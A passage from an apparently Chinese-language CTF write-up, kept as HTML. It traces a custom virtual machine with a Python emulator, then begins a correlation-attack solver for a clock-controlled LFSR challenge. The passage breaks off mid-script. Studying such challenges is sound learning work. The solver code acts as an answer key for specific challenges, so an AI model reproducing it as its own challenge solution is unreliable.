class="mi">26</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">25</span><span class="p">]</span>    
        <span class="n">EIP</span> <span class="o">=</span> <span class="mi">0</span>    
        <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>    
    <span class="k">else</span><span class="p">:</span>    
        <span class="k">break</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>    
    <span class="n">v31</span> <span class="o">=</span> <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span>    
    <span class="n">qword_6C09B8</span><span class="p">[</span><span class="n">v31</span><span class="p">]</span> <span class="o">=</span> <span class="n">arg2</span>    
    <span class="k">print</span> <span class="s2">&#34;v31 = qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;]&#34;</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6C09B8[&#34;</span><span class="p">,</span><span class="n">v31</span><span class="p">,</span><span class="s2">&#34;] = &#34;</span><span class="p">,</span><span class="n">arg2</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>            
    <span class="k">print</span> <span class="s2">&#34;qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] = &#34;</span><span class="p">,</span><span class="n">arg2</span>    
    <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">=</span> <span class="n">arg2</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>    
    <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">=</span> <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg2</span><span class="p">]</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] = qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg2</span><span class="p">,</span><span class="s2">&#34;];&#34;</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>    
    <span class="n">v29</span> <span class="o">=</span> <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg2</span><span class="p">]</span>    
    <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">=</span> <span class="n">qword_6C09B8</span><span class="p">[</span><span class="n">v29</span><span class="p">]</span>    
    <span class="k">print</span> <span class="s2">&#34;v29 = qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg2</span><span class="p">,</span><span class="s2">&#34;]&#34;</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] = qword_6C09B8[&#34;</span><span class="p">,</span><span class="n">v29</span><span class="p">,</span><span class="s2">&#34;]&#34;</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>    
    <span class="n">v30</span> <span class="o">=</span> <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span>    
    <span class="n">qword_6C09B8</span><span class="p">[</span><span class="n">v30</span><span class="p">]</span> <span class="o">=</span> <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg2</span><span class="p">]</span>    
    <span class="k">print</span> <span class="s2">&#34;v30 = qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;]&#34;</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6C09B8[&#34;</span><span class="p">,</span><span class="n">v30</span><span class="p">,</span><span class="s2">&#34;] = qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg2</span><span class="p">,</span><span class="s2">&#34;]&#34;</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">5</span><span class="p">:</span>    
    <span class="n">qword_6BF150</span> <span class="o">+=</span> <span class="mi">1</span>    
    <span class="n">qword_6BF1B8</span><span class="p">[</span><span class="n">qword_6BF150</span><span class="p">]</span> <span class="o">=</span> <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6BF150 = qword_6BF150 + 1&#34;</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6BF1B8[&#34;</span><span class="p">,</span><span class="n">qword_6BF150</span><span class="p">,</span><span class="s2">&#34;] = qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;]&#34;</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">6</span><span class="p">:</span>    
    <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">=</span> <span class="n">qword_6BF1B8</span><span class="p">[</span><span class="n">qword_6BF150</span><span class="p">]</span>    
    <span class="n">qword_6BF150</span> <span class="o">=</span> <span class="n">qword_6BF150</span> <span class="o">-</span> <span class="mi">1</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] = qword_6BF1B8[&#34;</span><span class="p">,</span><span class="n">qword_6BF150</span><span class="p">,</span><span class="s2">&#34;]&#34;</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6BF150 = qword_6BF150 - 1&#34;</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">7</span><span class="p">:</span>    
    <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">+=</span> <span class="n">arg2</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] += &#34;</span><span class="p">,</span><span class="n">arg2</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">8</span><span class="p">:</span>    
    <span class="n">v28</span> <span class="o">=</span> <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg2</span><span class="p">]</span>    
    <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">+=</span> <span class="n">v28</span>    
    <span class="k">print</span> <span class="s2">&#34;v28 = qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg2</span><span class="p">,</span><span class="s2">&#34;]&#34;</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] += &#34;</span><span class="p">,</span><span class="n">v28</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">9</span><span class="p">:</span>    
    <span class="n">v3</span> <span class="o">=</span> <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span>    
    <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">=</span> <span class="n">v3</span> <span class="o">-</span> <span class="n">arg2</span>    
    <span class="k">print</span> <span class="s2">&#34;v3 = qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;]&#34;</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] = &#34;</span><span class="p">,</span><span class="n">v3</span><span class="p">,</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="n">arg2</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">10</span><span class="p">:</span>    
    <span class="n">v27</span> <span class="o">=</span> <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg2</span><span class="p">]</span>    
    <span class="n">v4</span> <span class="o">=</span> <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span>    
    <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">=</span> <span class="n">v4</span> <span class="o">-</span> <span class="n">v27</span>    
    <span class="k">print</span> <span class="s2">&#34;v27 = qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg2</span><span class="p">,</span><span class="s2">&#34;]&#34;</span>    
    <span class="k">print</span> <span class="s2">&#34;v4 = qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;]&#34;</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] = &#34;</span><span class="p">,</span><span class="n">v4</span> <span class="p">,</span><span class="s2">&#34;-&#34;</span><span class="p">,</span><span class="n">v27</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">11</span><span class="p">:</span>    
    <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">*=</span> <span class="n">arg2</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] *= &#34;</span><span class="p">,</span><span class="n">arg2</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">12</span><span class="p">:</span>    
    <span class="n">v26</span> <span class="o">=</span> <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg2</span><span class="p">]</span>    
    <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">*=</span> <span class="n">v26</span>    
    <span class="k">print</span> <span class="s2">&#34;v26 = qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg2</span><span class="p">,</span><span class="s2">&#34;]&#34;</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] *= &#34;</span><span class="p">,</span><span class="n">v26</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">13</span><span class="p">:</span>    
    <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">&lt;&lt;=</span> <span class="n">arg2</span> <span class="o">&amp;</span> <span class="mh">0x3F</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] &lt;&lt;= &#34;</span><span class="p">,</span><span class="n">arg2</span><span class="p">,</span><span class="s2">&#34;&amp; 0x3F&#34;</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">14</span><span class="p">:</span>    
    <span class="n">v25</span> <span class="o">=</span> <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg2</span><span class="p">]</span>    
    <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">&lt;&lt;=</span> <span class="n">v25</span> <span class="o">&amp;</span> <span class="mh">0x3F</span>    
    <span class="k">print</span> <span class="s2">&#34;v25 = qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg2</span><span class="p">,</span><span class="s2">&#34;]&#34;</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] &lt;&lt;= &#34;</span><span class="p">,</span><span class="n">v25</span> <span class="p">,</span><span class="s2">&#34;&amp; 0x3F&#34;</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">15</span><span class="p">:</span>    
    <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">&gt;&gt;=</span> <span class="n">arg2</span> <span class="o">&amp;</span> <span class="mh">0x3F</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] &gt;&gt;= &#34;</span><span class="p">,</span><span class="n">arg2</span> <span class="p">,</span><span class="s2">&#34;&amp; 0x3F&#34;</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">16</span><span class="p">:</span>    
    <span class="n">v24</span> <span class="o">=</span> <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg2</span><span class="p">]</span>    
    <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">&gt;&gt;=</span> <span class="n">v24</span> <span class="o">&amp;</span> <span class="mh">0x3F</span>    
    <span class="k">print</span> <span class="s2">&#34;v24 = qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg2</span><span class="p">,</span><span class="s2">&#34;]&#34;</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] &gt;&gt;= &#34;</span><span class="p">,</span><span class="n">v24</span> <span class="p">,</span><span class="s2">&#34;&amp; 0x3F&#34;</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">17</span><span class="p">:</span>    
    <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">^=</span> <span class="n">arg2</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] ^= &#34;</span><span class="p">,</span><span class="n">arg2</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">18</span><span class="p">:</span>    
    <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">^=</span> <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg2</span><span class="p">]</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] ^= qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg2</span><span class="p">,</span><span class="s2">&#34;]&#34;</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">19</span><span class="p">:</span>    
    <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">|=</span> <span class="n">arg2</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] |= &#34;</span><span class="p">,</span><span class="n">arg2</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">20</span><span class="p">:</span>    
    <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">|=</span> <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg2</span><span class="p">]</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] |= qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg2</span><span class="p">,</span><span class="s2">&#34;]&#34;</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">21</span><span class="p">:</span>    
    <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">&amp;=</span> <span class="n">arg2</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] &amp;= &#34;</span><span class="p">,</span><span class="n">arg2</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">22</span><span class="p">:</span>    
    <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">&amp;=</span> <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg2</span><span class="p">]</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] &amp;= qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg2</span><span class="p">,</span><span class="s2">&#34;]&#34;</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">23</span><span class="p">:</span>    
    <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">index</span><span class="p">])</span>    
    <span class="n">index</span> <span class="o">=</span> <span class="n">index</span> <span class="o">+</span> <span class="mi">1</span>    
    <span class="k">print</span> <span class="s2">&#34;qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] =&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">[</span><span class="n">index</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span>    
    <span class="c1"># if flag == 32:    </span>
    <span class="c1">#     print &#34;get another one&#34;    </span>
    <span class="c1">#     break    </span>
    <span class="c1"># flag = True    </span>
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">24</span><span class="p">:</span>    
    <span class="n">v13</span> <span class="o">=</span> <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span>    
    <span class="k">print</span> <span class="s2">&#34;v13 = qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;]&#34;</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">26</span><span class="p">:</span>    
    <span class="n">byte_6BF1B0</span> <span class="o">=</span> <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">==</span> <span class="n">arg2</span>    
    <span class="n">byte_6BF1B1</span> <span class="o">=</span> <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">arg2</span>    
    <span class="k">print</span> <span class="s2">&#34;byte_6BF1B0 = qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] == &#34;</span><span class="p">,</span><span class="n">arg2</span>    
    <span class="k">print</span> <span class="s2">&#34;byte_6BF1B1 = qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] &lt; &#34;</span><span class="p">,</span><span class="n">arg2</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">27</span><span class="p">:</span>    
    <span class="n">byte_6BF1B0</span> <span class="o">=</span> <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">==</span> <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg2</span><span class="p">]</span>    
    <span class="n">byte_6BF1B1</span> <span class="o">=</span> <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg2</span><span class="p">]</span>    
    <span class="k">print</span> <span class="s2">&#34;byte_6BF1B0 = qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] == qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg2</span><span class="p">,</span><span class="s2">&#34;]&#34;</span>    
    <span class="k">print</span> <span class="s2">&#34;byte_6BF1B1 = qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg1</span><span class="p">,</span><span class="s2">&#34;] &lt; qword_6BF130[&#34;</span><span class="p">,</span><span class="n">arg2</span><span class="p">,</span><span class="s2">&#34;]&#34;</span>    
    <span class="k">print</span> <span class="s2">&#34;==&gt;&#34;</span><span class="p">,</span><span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg1</span><span class="p">],</span> <span class="n">qword_6BF130</span><span class="p">[</span><span class="n">arg2</span><span class="p">]</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">28</span><span class="p">:</span>    
    <span class="k">if</span> <span class="n">byte_6BF1B0</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>    
        <span class="n">EIP</span> <span class="o">=</span> <span class="n">arg1</span>    
    <span class="k">print</span> <span class="s2">&#34;if byte_6BF1B0 == 1: EIP = &#34;</span><span class="p">,</span><span class="n">arg1</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">29</span><span class="p">:</span>    
    <span class="n">EIP</span> <span class="o">=</span> <span class="n">arg1</span>    
    <span class="k">print</span> <span class="s2">&#34; EIP = &#34;</span><span class="p">,</span><span class="n">arg1</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">30</span><span class="p">:</span>    
    <span class="k">if</span> <span class="n">byte_6BF1B1</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>    
        <span class="n">EIP</span> <span class="o">=</span> <span class="n">arg1</span>    
    <span class="k">print</span> <span class="s2">&#34;if ( byte_6BF1B1 == 1 )EIP = &#34;</span><span class="p">,</span><span class="n">arg1</span>    
<span class="k">elif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">31</span><span class="p">:</span>    
    <span class="k">if</span> <span class="ow">not</span> <span class="n">byte_6BF1B0</span><span class="p">:</span>    
        <span class="n">EIP</span> <span class="o">=</span> <span class="n">arg1</span>    
    <span class="k">print</span> <span class="s2">&#34;if ( !byte_6BF1B0 )EIP = &#34;</span><span class="p">,</span><span class="n">arg1</span>    
<span class="k">else</span><span class="p">:</span>    
    <span class="k">print</span> <span class="s2">&#34;Unkown opcode&#34;</span><span class="p">,</span><span class="n">opcode</span>    
    <span class="k">break</span>    
</code></pre></td></tr></table>
</div>
</div><h2 id="clock">clock</h2>
<p>从这里开始都是我不会的题==   <br>
这个题的加密流程很容易能看出来,但是我不会解&hellip;后来师父来了很快就做出来了略(Helica好厉害好厉害我好菜我好菜),wp中说是穷举钟控的寄存器初态，对另外两个寄存器快速相关攻击。   <br>
程序实现了一个时钟控制的非线性移位寄存器，由一个lfsr控制另外两个lfsr的输出。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">x</span> <span class="o">=</span> <span class="n">n1</span> <span class="err">?</span> <span class="n">n3</span> <span class="p">:</span> <span class="n">n2</span>    
</code></pre></td></tr></table>
</div>
</div><p>用相关性攻击，先分析输出与三个lfsr的关系，可知输出与n2和n3相同的概率是0.75，和n1相同的概率是0.5。先分别爆破猜出n2和n3，之后再爆破推出n1。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">lfsr_1</span><span class="p">(</span><span class="n">R</span><span class="p">,</span> <span class="n">mask</span><span class="p">):</span>    
<span class="n">output</span> <span class="o">=</span> <span class="p">(</span><span class="n">R</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x1fffff</span>    
<span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">R</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x1fffff</span>    
